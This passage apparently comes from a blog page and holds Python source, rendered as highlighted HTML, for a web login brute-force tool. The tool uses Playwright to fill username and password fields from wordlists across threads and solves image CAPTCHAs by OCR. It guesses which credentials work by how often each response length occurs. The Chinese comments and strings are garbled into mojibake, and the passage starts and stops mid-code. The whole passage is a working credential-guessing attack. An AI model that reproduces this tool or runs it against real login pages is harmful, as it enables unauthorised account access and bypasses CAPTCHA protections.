è¯†åˆ«å¤±è´¥ï¼šæœªè¯†åˆ«å‡ºæ–‡æœ¬&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç è¯†åˆ«å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">solve_captcha</span>(<span class="params">self, page: Page</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è§£å†³éªŒè¯ç </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            page: Playwrighté¡µé¢å¯¹è±¡</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            éªŒè¯ç æ–‡æœ¬æˆ–None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æ£€æŸ¥éªŒè¯ç XPathæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">or</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># ç­‰å¾…éªŒè¯ç å›¾ç‰‡åŠ è½½</span></span><br><span class="line">            <span class="keyword">await</span> page.wait_for_selector(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è·å–éªŒè¯ç å›¾ç‰‡</span></span><br><span class="line">            captcha_locator = page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">await</span> captcha_locator.count() == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># æˆªå›¾è·å–éªŒè¯ç </span></span><br><span class="line">            screenshot = <span class="keyword">await</span> captcha_locator.first.screenshot()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è¯†åˆ«éªŒè¯ç </span></span><br><span class="line">            captcha_text = <span class="variable language_">self</span>.preprocess_captcha(screenshot)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> captcha_text:</span><br><span class="line">                <span class="comment"># è¾“å…¥éªŒè¯ç </span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_input_xpath&#125;</span>&quot;</span>).fill(captcha_text)</span><br><span class="line">                <span class="keyword">return</span> captcha_text</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç å¤„ç†å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">attempt_login</span>(<span class="params">self, username: <span class="built_in">str</span>, password: <span class="built_in">str</span>, thread_id: <span class="built_in">int</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        å°è¯•ç™»å½•</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            username: ç”¨æˆ·å</span></span><br><span class="line"><span class="string">            password: å¯†ç </span></span><br><span class="line"><span class="string">            thread_id: çº¿ç¨‹ID</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            ç™»å½•ç»“æœå­—å…¸</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">            <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">            <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;thread_id&#x27;</span>: thread_id,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> async_playwright() <span class="keyword">as</span> p:</span><br><span class="line">                <span class="comment"># å¯åŠ¨æµè§ˆå™¨</span></span><br><span class="line">                browser = <span class="keyword">await</span> p.chromium.launch(headless=<span class="literal">True</span>)</span><br><span class="line">                context = <span class="keyword">await</span> browser.new_context()</span><br><span class="line">                page = <span class="keyword">await</span> context.new_page()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è®¿é—®ç›®æ ‡é¡µé¢</span></span><br><span class="line">                <span class="keyword">await</span> page.goto(<span class="variable language_">self</span>.target_url, wait_until=<span class="string">&#x27;networkidle&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¡«å†™ç”¨æˆ·åå’Œå¯†ç </span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.username_xpath&#125;</span>&quot;</span>).fill(username)</span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.password_xpath&#125;</span>&quot;</span>).fill(password)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¤„ç†éªŒè¯ç ï¼ˆå¦‚æœå­˜åœ¨ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">and</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                    captcha_text = <span class="keyword">await</span> <span class="variable language_">self</span>.solve_captcha(page)</span><br><span class="line">                    <span class="keyword">if</span> captcha_text:</span><br><span class="line">                        result[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç‚¹å‡»ç™»å½•æŒ‰é’®</span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.login_button_xpath&#125;</span>&quot;</span>).click()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç­‰å¾…é¡µé¢å“åº”</span></span><br><span class="line">                <span class="keyword">await</span> page.wait_for_timeout(<span class="number">2000</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è·å–é¡µé¢å†…å®¹ç”¨äºé•¿åº¦åˆ†æ</span></span><br><span class="line">                page_content = <span class="keyword">await</span> page.content()</span><br><span class="line">                content_length = <span class="built_in">len</span>(page_content)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°†å“åº”é•¿åº¦ä¿å­˜åˆ°ç»“æœä¸­ï¼Œç”¨äºåç»­åˆ†æ</span></span><br><span class="line">                result[<span class="string">&#x27;response_length&#x27;</span>] = content_length</span><br><span class="line">                result[<span class="string">&#x27;final_url&#x27;</span>] = page.url</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æ³¨æ„ï¼šè¿™é‡Œä¸ç›´æ¥åˆ¤æ–­æˆåŠŸ/å¤±è´¥ï¼Œè€Œæ˜¯è®°å½•å“åº”é•¿åº¦</span></span><br><span class="line">                <span class="comment"># çœŸæ­£çš„æˆåŠŸåˆ¤æ–­å°†åœ¨æ‰€æœ‰å°è¯•å®Œæˆåé€šè¿‡åˆ†æå“åº”é•¿åº¦é‡å¤ç‡æ¥ç¡®å®š</span></span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">None</span>  <span class="comment"># æš‚æ—¶ä¸åˆ¤æ–­ï¼Œç­‰å¾…åç»­åˆ†æ</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">await</span> browser.close()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            result[<span class="string">&#x27;error&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line">            result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_result</span>(<span class="params">self, result: <span class="built_in">dict</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†å•ä¸ªç»“æœ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">            <span class="variable language_">self</span>.results.append(result)</span><br><span class="line">            <span class="comment"># è¾“å‡ºæ ¼å¼ï¼šç”¨æˆ·å | å¯†ç  | å“åº”é•¿åº¦</span></span><br><span class="line">            response_length = result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> | <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> | <span class="subst">&#123;response_length&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æš‚æ—¶ä¸åˆ¤æ–­æˆåŠŸ/å¤±è´¥ï¼Œç­‰å¾…æ‰€æœ‰ç»“æœæ”¶é›†å®Œæˆåç»Ÿä¸€åˆ†æ</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze_response_lengths</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ†æå“åº”é•¿åº¦é‡å¤ç‡æ¥åˆ¤æ–­ç™»å½•æˆåŠŸ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç»Ÿè®¡å“åº”é•¿åº¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line">        length_counts = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;response_length&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                length = result[<span class="string">&#x27;response_length&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> length <span class="keyword">not</span> <span class="keyword">in</span> length_counts:</span><br><span class="line">                    length_counts[length] = []</span><br><span class="line">                length_counts[length].append(result)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æŒ‰å‡ºç°æ¬¡æ•°æ’åºï¼ˆé‡å¤ç‡ä»é«˜åˆ°ä½ï¼‰</span></span><br><span class="line">        sorted_lengths = <span class="built_in">sorted</span>(length_counts.items(), key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå“åº”é•¿åº¦åˆ†æ:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘ç° <span class="subst">&#123;<span class="built_in">len</span>(length_counts)&#125;</span> ç§ä¸åŒçš„å“åº”é•¿åº¦&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ†æç»“æœ</span></span><br><span class="line">        <span class="keyword">for</span> i, (length, results) <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_lengths):</span><br><span class="line">            count = <span class="built_in">len</span>(results)</span><br><span class="line">            percentage = (count / <span class="built_in">len</span>(<span class="variable language_">self</span>.results)) * <span class="number">100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  é•¿åº¦ <span class="subst">&#123;length&#125;</span>: å‡ºç° <span class="subst">&#123;count&#125;</span> æ¬¡ (<span class="subst">&#123;percentage:<span class="number">.1</span>f&#125;</span>%)&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¦‚æœè¿™ä¸ªé•¿åº¦åªå‡ºç°ä¸€æ¬¡ï¼Œå¯èƒ½æ˜¯ç™»å½•æˆåŠŸ</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">                result = results[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;å”¯ä¸€å“åº”é•¿åº¦ <span class="subst">&#123;length&#125;</span>&#x27;</span></span><br><span class="line">                <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    â†’ æ ‡è®°ä¸ºå¯èƒ½æˆåŠŸ: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span>:<span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># æ ‡è®°ä¸ºå¤±è´¥ï¼ˆé‡å¤ç‡é«˜ï¼‰</span></span><br><span class="line">                <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                    result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">                    result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;å“åº”é•¿åº¦é‡å¤ <span class="subst">&#123;count&#125;</span> æ¬¡&#x27;</span></span><br><span class="line">                    <span class="variable language_">self</span>.failed_count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¦‚æœæ²¡æœ‰å”¯ä¸€é•¿åº¦ï¼Œé€‰æ‹©é‡å¤ç‡æœ€ä½çš„ä½œä¸ºå¯èƒ½çš„æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.success_count == <span class="number">0</span> <span class="keyword">and</span> sorted_lengths:</span><br><span class="line">            <span class="comment"># æ‰¾åˆ°é‡å¤ç‡æœ€ä½çš„é•¿åº¦</span></span><br><span class="line">            min_count = <span class="built_in">min</span>(<span class="built_in">len</span>(results) <span class="keyword">for</span> _, results <span class="keyword">in</span> sorted_lengths)</span><br><span class="line">            <span class="keyword">for</span> length, results <span class="keyword">in</span> sorted_lengths:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(results) == min_count:</span><br><span class="line">                    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                        result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                        result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;é‡å¤ç‡æœ€ä½çš„å“åº”é•¿åº¦ <span class="subst">&#123;length&#125;</span> (é‡å¤ <span class="subst">&#123;min_count&#125;</span> æ¬¡)&#x27;</span></span><br><span class="line">                        <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  é€‰æ‹©é‡å¤ç‡æœ€ä½çš„é•¿åº¦ <span class="subst">&#123;length&#125;</span> ä½œä¸ºå¯èƒ½çš„æˆåŠŸ&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run_bruteforce</span>(<span class="params">self, usernames: <span class="type">List</span>[<span class="built_in">str</span>], passwords: <span class="type">List</span>[<span class="built_in">str</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è¿è¡Œçˆ†ç ´æ”»å‡»</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            usernames: ç”¨æˆ·ååˆ—è¡¨</span></span><br><span class="line"><span class="string">            passwords: å¯†ç åˆ—è¡¨</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nç›®æ ‡URL: <span class="subst">&#123;self.target_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç”¨æˆ·åæ•°é‡: <span class="subst">&#123;<span class="built_in">len</span>(usernames)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç æ•°é‡: <span class="subst">&#123;<span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ€»å°è¯•æ¬¡æ•°: <span class="subst">&#123;<span class="built_in">len</span>(usernames) * <span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;çº¿ç¨‹æ•°: <span class="subst">&#123;self.max_threads&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        </span><br><span class="line">        start_time = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„ç”¨æˆ·åå¯†ç ç»„åˆ</span></span><br><span class="line">        combinations = []</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">                combinations.append((username, password))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ä½¿ç”¨çº¿ç¨‹æ± æ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="variable language_">self</span>.max_threads) <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># æäº¤æ‰€æœ‰ä»»åŠ¡</span></span><br><span class="line">            future_to_combo = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> i, (username, password) <span class="keyword">in</span> <span class="built_in">enumerate</span>(combinations):</span><br><span class="line">                future = executor.submit(</span><br><span class="line">                    asyncio.run, </span><br><span class="line">                    <span class="variable language_">self</span>.attempt_login(username, password, i % <span class="variable language_">self</span>.max_threads)</span><br><span class="line">                )</span><br><span class="line">                future_to_combo[future] = (username, password)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¤„ç†å®Œæˆçš„ä»»åŠ¡</span></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(future_to_combo):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = future.result()</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(result)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    username, password = future_to_combo[future]</span><br><span class="line">                    error_result = &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">                        <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">                        <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">                        <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">                        <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e),</span><br><span class="line">                        <span class="string">&#x27;thread_id&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(error_result)</span><br><span class="line">        </span><br><span class="line">        end_time = time.time()</span><br><span class="line">        duration = end_time - start_time</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ†æå“åº”é•¿åº¦é‡å¤ç‡</span></span><br><span class="line">        <span class="variable language_">self</span>.analyze_response_lengths()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¾“å‡ºç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ€»è€—æ—¶: <span class="subst">&#123;duration:<span class="number">.2</span>f&#125;</span>ç§’&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸ: <span class="subst">&#123;self.success_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤±è´¥: <span class="subst">&#123;self.failed_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸç‡: <span class="subst">&#123;(self.success_count / <span class="built_in">len</span>(combinations) * <span class="number">100</span>):<span class="number">.2</span>f&#125;</span>%&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¾“å‡ºæˆåŠŸçš„ç»“æœ</span></span><br><span class="line">        successful_results = [r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="variable language_">self</span>.results <span class="keyword">if</span> r.get(<span class="string">&#x27;success&#x27;</span>) == <span class="literal">True</span>]</span><br><span class="line">        <span class="keyword">if</span> successful_results:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nå¯èƒ½çš„å‡­æ®:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> successful_results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  ç”¨æˆ·å: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> (é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;username_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  å¯†ç : <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> (é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;password_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  å“åº”é•¿åº¦: <span class="subst">&#123;result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  åˆ†æåŸå› : <span class="subst">&#123;result.get(<span class="string">&#x27;analysis_reason&#x27;</span>, <span class="string">&#x27;æœªçŸ¥&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;final_url&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  æœ€ç»ˆURL: <span class="subst">&#123;result[<span class="string">&#x27;final_url&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Webç™»å½•çˆ†ç ´å·¥å…·&#x27;</span>, formatter_class=CustomHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç›®æ ‡URL&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--username-xpath&#x27;</span>, <span class="string">&#x27;-ux&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç”¨æˆ·åè¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--password-xpath&#x27;</span>, <span class="string">&#x27;-px&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;å¯†ç è¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-img-xpath&#x27;</span>, <span class="string">&#x27;-cx&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;éªŒè¯ç å›¾ç‰‡XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-input-xpath&#x27;</span>, <span class="string">&#x27;-cix&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;éªŒè¯ç è¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--login-button-xpath&#x27;</span>, <span class="string">&#x27;-lx&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç™»å½•æŒ‰é’®XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--threads&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">&#x27;çº¿ç¨‹æ•°é‡ (é»˜è®¤: 5)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--usernames&#x27;</span>, <span class="string">&#x27;-uf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç”¨æˆ·åæ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--passwords&#x27;</span>, <span class="string">&#x27;-pf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;å¯†ç æ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ (æ”¯æŒ .xlsx, .csv, .json æ ¼å¼)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºçˆ†ç ´å™¨å®ä¾‹</span></span><br><span class="line">    bruster = LoginBruster(</span><br><span class="line">        target_url=args.url,</span><br><span class="line">        username_xpath=args.username_xpath,</span><br><span class="line">        password_xpath=args.password_xpath,</span><br><span class="line">        captcha_img_xpath=args.captcha_img_xpath,</span><br><span class="line">        captcha_input_xpath=args.captcha_input_xpath,</span><br><span class="line">        login_button_xpath=args.login_button_xpath,</span><br><span class="line">        max_threads=args.threads</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åŠ è½½ç”¨æˆ·åå’Œå¯†ç æ–‡ä»¶</span></span><br><span class="line">    usernames = bruster.load_wordlist(args.usernames)</span><br><span class="line">    passwords = bruster.load_wordlist(args.passwords)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> usernames:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é”™è¯¯ï¼šæ— æ³•åŠ è½½ç”¨æˆ·åæ–‡ä»¶æˆ–æ–‡ä»¶ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> passwords:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é”™è¯¯ï¼šæ— æ³•åŠ è½½å¯†ç æ–‡ä»¶æˆ–æ–‡ä»¶ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¿è¡Œçˆ†ç ´</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        results = asyncio.run(bruster.run_bruteforce(usernames, passwords))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ä¿å­˜ç»“æœåˆ°æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="comment"># åˆ›å»ºDataFrame</span></span><br><span class="line">            df_data = []</span><br><span class="line">            <span class="keyword">for</span> result 